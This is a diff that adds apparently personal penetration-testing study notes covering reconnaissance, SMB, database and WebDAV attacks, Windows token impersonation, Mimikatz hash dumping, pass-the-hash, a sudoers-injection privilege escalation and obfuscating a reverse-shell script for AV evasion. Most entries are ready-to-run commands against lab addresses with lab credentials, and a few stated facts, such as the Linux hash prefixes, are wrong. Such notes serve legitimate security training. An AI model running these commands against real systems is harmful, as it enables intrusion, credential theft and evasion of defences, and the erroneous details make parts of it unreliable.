@@ -1,0 +1,529 @@
+#dpkg --list
+#sudo apt-get --purge remove cyberfox
+
+Zonetransfer.me (that is vulnerable domain)
+
+1.host command is used to find IP address of the domain name (DNS lookup)
+
+#host hackthebox.com
+
+
+2.sitemap.xml to show hidden directory (thses directories can be indexed by search engine)
+
+#www.hackersploit.com/sitemap.xml
+
+3.builwith extension adds on gives multiple subdomains, APIs,CDN and others that website used
+
+4.rockyou.txt has a list of directory that are not indexed by search engine.
+
+5.dnsrecon && dnsdumpster.com, it enumerates General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).
+But dnsdumpster.com can do active scanning too by clicking buttons. Can also look the graph of the domain infracture.
+
+#dnsrecon -d hackersploit.org
+
+*** CLOUD FLARE really doesn't hide Mail Server Address. *** (can do nmap port scanning with dnsdumpster.com)
+
+TXT record
+-------------
+The TXT record was originally intended as a place for human-readable notes. However, now it is also possible to put some machine-readable data into TXT records. One domain can have many TXT records.
+These records are often used for various purposes  
+
+1. Verifying domain ownership for services like email or webmaster tools, 
+2. Providing additional information about a domain or its services
+3. configuring security settings like SPF (Sender Policy Framework) records for email authentication.
+
+example --> "4b7570f2564f4074b42872e1d78668ad"
+			"adobe-idp-site-verification=5d77b0274800290cf193145126595b14308358f46dfe90eba5e298f99d32d2fc"
+
+
+6.wafw00f is used to identify WAF
+
+#wafw00f hackthebox.com -a 
+
+7.Subli3ter and theHarvester are used to bruteforce subdomains with the help of search engine (GOOGLE, YAHOO, Dumpster.com), it is passive subdoman recon. But the Harvester bruteforces more than subdoamins (IPs, Emails)
+
+8.Google dorking --> intitle:index of inurl:.com (index of vul can do directory listing)
+  You can also use GHDB (google hacking database from exploit.db) to know updated google dorking.
+
+
+9.SOA  - domain authority
+  SRV  - service records
+  CNAME- used for domain aliases
+| Username | Password | | administrator | smbserver_771 |
+10.The objective of DNS interogation is to probe the DNS server to provide us with DNS records for a specific domain.
+
+11.Zone transfer - In certain cases, DNS admin may want to copy or transfer zone files (DNS records) from one DNS server to 					   another DNS server.If it is left misconfigured, this functionality can be abused by the attackers.
+  				   DNS zone transfer provides attacker with a holistic view of organization's internal network.
+
+for example ----> staging.zonetransfer.me.                 7200     IN    CNAME    www.sydneyoperahouse.com.
+				  staging.zonetransfer.me is CNAME
+				  When you click staging.zonetransfer.me, it will redirect to www.sydneyoperahouse.com
+
+
+12. Dig and dnsenum - are active zone transfer tools, but if DNS zone transfer is disabled or DNS name server doesn't have zone 					  transfer function, can't show DNS additional records
+
+#dig axfr @a.ns.hackerone.com hackerone.com  (axfr -zone transfer)
+#dnsenum hackerone.com
+
+13. nmap -T1 is sneaky scanning
+
+14.Network mapping in penetration testing refers to the process of discovering and identifying devices, services, and hosts on a target network.
+
+15.Ping Sweeping is the host discovery technique involves sending ICMP Echo Request packets to address or range of address and analyzing their responses to determine which addresses are active or not.
+
+ICMP type 8 - echo request
+ICMP type 0 - echo reply
+
+#ping 192.158.0.0/24
+
+-Pn (no Ping sweep)
+
+16.-PE is used to perform a ping sweep using ICMP Echo Request
+
+17. --version-intensity is used for the aggressiveness of service version detection
+	#nmap --version-intensity <intensity_level> [other options] <target>
+	#nmap --version-intensity 5 -p 1-1000 10.10.1.23
+
+18.--script=category can specify script categories when using NSE script
+   #nmap --script=discovery [other options] <target>
+
+
+19. check ifconfig, in eth0 192.44.118.2 is your ip but the next ip is your target ip 192.44.118.3
+
+20.Firewall & IDS, IPS evasion
+	 
+	 #nmap -Pn -sS -sV -p 3389,445 -f --data-length 200 -D 10.10.23.1,10.10.23,2 10.4.27.83
+
+	 -f is fragmenting the packets
+	 -D is decoy (10.10.23.1,10.10.23,2 are decoyed IP)
+	 10.4.27.83 is target IP
+
+	 if you don't scan like this, we don't even know those ports are open or closed, what we see is only filtered or unfiltered.
+
+21.-oG output format in Nmap provides a machine-readable format that can be easily parsed by scripts and tools.
+
+22.Find SMB security level information
+	 #nmap -p445 --script smb-security-mode 10.0.17.200
+
+
+23.Find SMB share in windows and connect with map network drive
+
+Always open with powershell (| Username | Password | | administrator | smbserver_771 |)
+
+	 1.ipconfig
+
+	  Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
+ 		Link-local IPv6 Address . . . . . : fe80::8455:5e71:9335:d5cf%25
+ 		IPv4 Address. . . . . . . . . . . : 10.0.18.93
+ 		Subnet Mask . . . . . . . . . . . : 255.255.240.0
+ 		Default Gateway . . . . . . . . . : 10.0.16.1
+
+ 	 2.find target IP
+
+ 	   #nmap 10.0.18.0/24 --open
+ 	   10.0.21.94 (target IP)
+
+ 	 3.connect with map network drive -- My folder > Network > RC > map network drive > //10.0.21.94 > browse > put credentials > finish
+
+ 	 4.net use * /delete (delete stored session - map network drive)
+
+ 	 5. net use Z: \\10.0.22.92\C$ smbserver_771 /user:administrator (connect with command)
+
+
+24.Using smbmap
+
+	 Remote code execution through smb
+
+   #smbmap -H 10.4.52.2 -u Administrator -p 'smbserver_771' -d . -x 'ipconfig'
+
+   Connect to C drive and list the directories through smb
+
+   #smbmap -H 10.4.52.2 -u Administrator -p 'smbserver_771' -r 'C$'
+
+   Upload the file through smb
+
+   #smbmap -H 10.4.52.2 -u Administrator -p 'smbserver_771' --upload '/root/backdoor' 'C$\backdoor'
+
+   Download the file through smb
+
+   #smbmap -H 10.4.52.2 -u Administrator -p 'smbserver_771' --download 'C$\flag.txt' 
+
+
+25.Connect smb with rpcclient
+
+	 #rpcclient -U "" -N 192.168.72.3 
+	 >srvinfo (to see service version)
+	 >enumdomgroups (to see group list)
+
+	 Enumerate SID user with rpcclient
+
+26.#enum4linux -U -G -S 192.158.73.2 (to see user list,member group and smb share)
+	 
+	 SID brute with enum4linux
+	 --------------------------
+
+	 #enum4linux -r -u 'admin' -p 'password1' 192.168.73.2
+
+27.Use msfconsole to bruteforce smb_login and can also use hydra.
+
+	 msf6> use auxiliary/scanner/smb/smb_login
+
+
+28.To see hashdump in mysql > use auxiliary/scanner/mysql/mysql_hashdump 
+
+29.mysql -h $Target_IP -u root
+	 
+30.To see etc/shadow file in mysql database
+	 MySQL> select load_file("/etc/shadow");
+
+
+31.MySQL NSE script
+ 	 #nmap 192.125.84.2 -sV -p 3306 --script mysql-users --script-args "mysqluser='root',mysqlpass=''"
+ 	 #nmap 192.125.84.2 -sV -p 3306 --script mysql-databases --script-args "mysqluser='root',mysqlpass=''"
+ 	 #nmap 192.125.84.2 -sV -p 3306 --script mysql-dump-hashes --script-args "username='root',password=''"
+ 	 #nmap 192.125.84.2 -sV -p 3306 --script mysql-query --script-args "query 'select * from books.author;',username='root',password=''"
+
+ 	 #hydra -l root -P /usr/share/wordlist/rockyou.txt 192.158.2.34 mysql
+
+32.MSSQL NSE script
+
+	 1433   ms-sql-s (MSSQL server)
+
+	 #nmap 192.125.84.2 -sV -p 1433 --script ms-sql-brute --script-args userdb=/usr/share/wordlists/seclists/common.txt,passdb=/usr/share/wordlists/seclists/passwd.txt
+
+	 #nmap 192.125.84.2 -sV -p 1433 -sV --script ms-sql-info
+
+	 GET RCE from NSE script
+
+	 #nmap 192.125.84.2 -sV -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin mssql.password=anamicina,ms-sql-xp-cmdshell.cmd="ipconfig"
+
+33.GDPR is a privacy regulation applies specifically to organizations doing business in the EU and EEA
+
+34.(1)COBIT framework includes a business focus and generic processes for management of IT
+	 (2)ASD Essential 8 framework was designed to protect Microsoft Windows-based networks.
+	 (3)CIS Controls and CIS Benchmarks framework focuses on mitigating the most prevalent cyber-attacks
+	 (4)Pentesting is not usually performed during an audit
+
+35.STIG viewer and SCAP protocol are used to automate security-related tasks.For example, they scan Microsoft Server 2019,it will 	 show some vulnerabilities but they also automate the solution to that vulnerabilities.Both tools play important roles in 				 ensuring the security and compliance of systems within government and military organizations.
+
+
+38.MS08-017 (Conflicker), MS17-010 (EternalBlue)
+
+
+39.Frequently exploited Windows' services
+	 
+	 (1)WebDAV(Web distributed authoring & Versioning)--> TCP port 80/443 
+
+	 		 It is a HTTP extension or protocol that allows client to delete,upload,move and copy files on a Web server.
+
+	 (2)WinRM(Windows remote management protocol)--> TCP port 5985/443
+
+	 		 RDP and WinRM are remote access to Windows systems, 	 is primarily focused on management tasks and operates over a web service, while RDP is focused on providing full desktop access and operates over its proprietary protocol.
+
+40.IIS can be hosted both static and dynamic web pages developed in ASP.NET and php
+	 IIS supported extensions such as (.asp, .aspx, .config, .php)
+
+41.WebDAV exploitation
+	 (1)Check WebDAV have been configured in IIS Web server
+	 (2)Bruteforce-Attack on WebDAV server
+	 (3)After login into WebDAV server, upload malicious .asp payload to get reverse shell & to execute arbitary commands.
+
+	 Tools
+
+	 Davtest- it is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files
+
+	 Cadaver- it is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.
+
+	 #nmap -sC -sV -p- 10.4.2.43
+
+	 80/tcp    open  http          Microsoft IIS httpd 10.0
+
+	| http-methods: 
+	|   Supported Methods: OPTIONS TRACE GET HEAD POST COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
+	|_  Potentially risky methods: TRACE COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
+	|_http-server-header: Microsoft-IIS/10.0
+	|_http-title: Did not follow redirect to /Default.aspx
+	| http-webdav-scan: 
+	|   Server Type: Microsoft-IIS/10.0
+	|   Server Date: Mon, 29 Apr 2024 12:59:08 GMT
+	|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
+	|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+	|_  WebDAV type: Unknown
+
+	#nmap -sV -p 80 10.4.2.43
+
+	80/tcp open  http    Microsoft IIS httpd 10.0
+| http-enum: 
+|_  /webdav/: Potentially interesting folder (401 Unauthorized)
+|_http-server-header: Microsoft-IIS/10.0
+
+	#hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.0.24.2 http-get /webdav/
+
+
+	#davtest -auth bob:password_123321 -url http://10.0.24.2/webdav/
+
+	Can upload .asp extension
+
+	EXEC	asp	SUCCEED:	http://10.0.24.2/webdav/DavTestDir_gPp2DitDx/davtest_gPp2DitDx.asp
+
+	#cadaver http://10.0.24.2/webdev
+	daver> put /usr/share/webshells/asp/webshell.asp
+
+42.PsExec via SMB
+	 PsExec is a command-line tool developed by Sysinternals, which is now a part of Microsoft.
+	 PsExec essentially provides a way to run commands or launch processes on remote systems from the command line of a local computer.
+
+	 Host script results:
+	 | smb2-security-mode: 
+	 |   2.02: 
+	 |_    Message signing enabled but not required
+
+	 If the message signing is enabled, we can use psexec.py
+
+	 psexec.py Administrator@192.168.72.4
+
+43.nmap -sV 445 --script smb-vuln-ms17-010 192.158.2.44 (To check eternal blue vuln)
+	 
+44.To identify RDP port 
+
+	 RDP isn't run on default port 3389,sometimes, RDP use custom port. Use rdp_scanner in msfconsole.
+	 
+	 3333/tcp  open  ssl/dec-notes?
+|  ssl-cert: Subject: commonName=WIN-OMCNBKR66MN
+
+	 #use scanner/rdp/rdp_scanner
+
+45.Bluekeep RDP vul
+
+	 This vul is published by Microsoft.It targets the memory size and get the shell access or crash the system.
+
+	 Use msfconsole and search bluekeep
+
+
+46.Bruteforce WinRM with crackmapexec (Eventhough 5985 port is not opened in normal scan use nmap -p 5985 to scan)
+	 
+	 PORT     STATE SERVICE VERSION
+	 5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+
+	 #crackmapexec winrm 10.0.27.38 -u administrator -p /usr/share/wordlist/pass.txt 
+	 #crackmapexec winrm 10.0.27.38 -u administrator -p 'hiihello1' -x "sysinfo"
+
+	 Use evil-winrm.rb to get a shell
+
+	 #evil-winrm.rb -u administrator -p tinkerbell -i 10.0.27.38 crackmapexec winrm 10.0.27.38 -u administrator -p 'hiihello1' -x "sysinfo"
+________________________________________________________________________________________________________________________________________________________
+
+Privilege Escalation
+--------------------
+1.Use msfconsole to search suggester (module),to scan possible exploited module in msfconsole
+
+	Before using that module, you need to have normal meterpreter session.After that,use the module suggester and add that session in that module.
+	If the possible exploited module is found, use one of those to get priviledged escalation.
+
+2.Use Windows-Exploit-Suggester (https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+
+	(1)Before we running the python script,we need to have (systeminfo) from meterpreter normal shell,save that info a txt file.
+
+	(2)To establish windows vul database, the database will be saved with .xlsx extension
+
+	./windows-Exploit-Suggester.py --update
+
+	(3)Run that python script and it will compare it's database with systeminfo information to find vul
+
+	./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
+
+	#Finally found MS16-135 exploit, and upload 41015.exe from meterpreter and get a Priv escalation.
+
+3.UAC (User Account Control)
+	
+	UAC is the windows security feature that is used to ensure that changes to the operating system require approval from the administrator or a user account that is part of the administrator group.
+
+	In order to successfully bypass UAC, we will need to have access to the user account that is part of the local administrator group on the Windows target system.
+
+	In windows search bar > User account control (normal --> default), if UAC turns into always notify hard to penetrate.
+
+	>net users
+	>net localgroup administrators
+
+	Download UACME from github (akagi.exe --> main.c)
+
+
+4.Shell updating
+	
+	meterpreter >pgrep explorer (explorer process-id running in meterpreter session 2448)
+						  >migrate 2448  	(migrate from real process-id to 2448 to get 64 bit meterpreter shell)
+
+	If migratation isn't successful,we are exploitating unprivileged user(service user).
+
+
+5.sessions set up in msfconsole
+
+	msf6 > sessions 1
+			 > sessions -K (kill session)
+
+5.Windows Access Tokens
+
+	Windows Access Tokens are a core element of the authentication process on Windows,it is managed and created by LSASS (Local Security Authority Subsytem Service)--> LSASS.exe
+	Access Tokens are generated by the winlogon.exe process every time a user authenticates successfully.This token is attached to the userinit.exe process.
+
+	If SeImpersonatePrivilege is available, we can usesimpersonate token attack using Incognito module from meterpreter session.
+
+
+	Delegation Token
+	----------------
+	This Access Token is direct result from interactive login
+
+	Impersonation Token
+	--------------------
+	This Access Token is direct result from non-interactive login
+
+
+	meterpreter > getprivs (to search SeImpersonatePrivilege is available)
+							> load incognito 
+							> list_tokens -u (to see access tokens)
+
+	Delegation Tokens Available
+========================================
+  ATTACKDEFENSE\Administrator
+  NT AUTHORITY\LOCAL SERVICE
+
+	Impersonation Tokens Available
+========================================
+	No tokens available
+
+	meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
+__________________________________________________________________________________________________________________________________
+
+Windows Hashes
+-----------------
+
+1.Windows OS stores User account's password hashes locally in SAM(Security Accounts Manager) database.
+
+2.Authentication and verification of user credentials is facilitated by LSA
+
+3.Windows Server 2003 utilize LM and NTLM hashes
+
+4.Windows NT kernel keeps the SAM database file locked and as a result attackers utilize in-memory techniques and tools to dump 		SAM hashes from the LSASS process.
+
+5.In modern versions of Windows,SAM database is encrypted with a syskey.
+
+6.NTLM protocol use MD4 hashing algorithm.
+
+
+Unattended Windows Setup Utility
+---------------------------------
+
+The Unattended Windows Setup Utility, it allows system administrators to automate the installation process of Windows operating systems, including the setup of drivers, applications, and configurations, without requiring manual intervention for each installation
+
+It utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account's password.
+
+If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.
+
+
+The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
+
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Autounattend.xml
+
+As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.
+
+
+Mimikatz
+---------
+
+Mimikatz is a Windows post-exploitation tool. It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.
+
+Mimikatz can be used to extract hashes from the lsass.exe process memory where hashes are cached.
+
+We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension Kiwi.
+
+**Mimikatz needs elevated privileges in order to run correctly**
+
+
+meterpreter > load kiwi
+						> ?
+						>lsa_dump_sam
+						>hashdump
+
+Upload your mimikatz.exe to target system and run .\mimikatz.exe
+
+mimikatz > lsadump::sam (NTLM hash)
+
+PASS THE HASH 
+--------------
+
+metasploit smb/psexec module
+crackmapexec
+ 
+
+crackmapexec winrm 10.0.27.38 -u administrator -H '$HASH' -x "sysinfo"
+__________________________________________________________________________________________________________________________________
+
+Linux
+-----
+
+Shellshock Vul (CVE 2014-6271)
+-------------------------------
+
+It allows an attacker to execute remote arbitrary commands via BASH shell.
+
+Apache web servers configured to run CGI scripts (Common Gateway Interface) and .sh scripts. CGI script is used to execute arbitrary commands on the linux system after the output is displayed to the client.
+
+Run the bash command in cgi script's user-agent place.
+
+
+Find the file recurisvely
+--------------------------
+#grep -rnw /usr -e /home/student/message (message file has been seen in code.sh file)
+
+
+Writing (root)NOPASSWD:ALL command
+-------------------------------------
+printf '#!/bin/bash\necho "student:ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+
+When you run copy.sh,student user doesn't need root password to run commands
+#sudo -l
+
+(root)NOPASSWD:ALL
+
+
+Linux hashing algorithm
+-----------------------
+
+$1 --> MD5
+$2 --> Blowfish
+$3 --> SHA-256
+$4 --> SHA-512
+
+
+AV Evasion && Obfuscating
+-------------------------
+
+#git clone https://github.com/danielbohannon/Invoke-Obfuscation
+
+
+In order to obfuscating --> need to install powershell --> to run .ps1 script
+
+#sudo apt-get install powershell -y
+
+#pwsh
+
+PS /home/kali/Desktop/ > cd ./Invoke-Obfuscation
+											 > Import-Module ./Invoke-Obfuscation.ps1
+											 > cd ..
+											 > Invoke-Obfuscation
+
+Need to have malicious script (for example reverse shell script --> shell.ps1),after that set the scriptpath
+
+Invoke-Obfuscation > set SCRIPTPATH /home/kali/Desktop/shell.ps1
+			
+								   > Encoding
+								   > Reset (If you want to reset the process)
+								   > AST (if you want to encode only Powershell AST )
+
+After that copy the encoding and save in .ps1 file, after that transport to target and run.
+
+#nc -lvnp 1234 (listen and connect)
+
+
